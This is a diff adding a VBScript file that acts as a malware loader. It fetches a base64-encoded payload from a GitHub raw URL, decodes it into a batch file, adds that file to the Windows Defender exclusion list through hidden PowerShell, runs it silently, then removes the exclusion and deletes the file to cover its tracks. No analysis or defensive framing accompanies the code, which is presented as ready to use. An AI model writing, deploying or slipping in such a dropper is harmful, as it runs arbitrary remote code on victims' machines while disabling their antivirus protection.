@@ -1,0 +1,43 @@
+' Define the URL of the encoded file
+encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
+decodedFilePath = "C:\Users\Administrator\Desktop\decoded.bat"
+
+' Create XMLHTTP object to fetch the file
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.Open "GET", encodedFileUrl, False
+objXMLHTTP.Send
+
+' Check if the request was successful
+If objXMLHTTP.Status = 200 Then
+    ' Get the Base64 encoded content from the response
+    encodedContent = objXMLHTTP.responseText
+    
+    ' Decode the Base64 string
+    Set objXML = CreateObject("MSXML2.DOMDocument")
+    Set objNode = objXML.createElement("tmp")
+    objNode.dataType = "bin.base64"
+    objNode.Text = encodedContent
+    decodedContent = objNode.nodeTypedValue
+
+    ' Write the decoded content to a temporary batch file
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(decodedFilePath, True)
+    objFile.Write decodedContent
+    objFile.Close
+
+    ' Add the decoded batch file to antivirus exclusion list
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -Command Add-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
+
+    ' Execute the batch file silently
+    objShell.Run Chr(34) & decodedFilePath & Chr(34), 0, True
+
+    ' Remove the exclusion after execution
+    objShell.Run "powershell -Command Remove-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
+
+    ' Clean up by deleting the temporary decoded batch file
+    objFSO.DeleteFile(decodedFilePath)
+Else
+    ' Handle failure in downloading the file
+    MsgBox "Failed to download the encoded file."
+End If
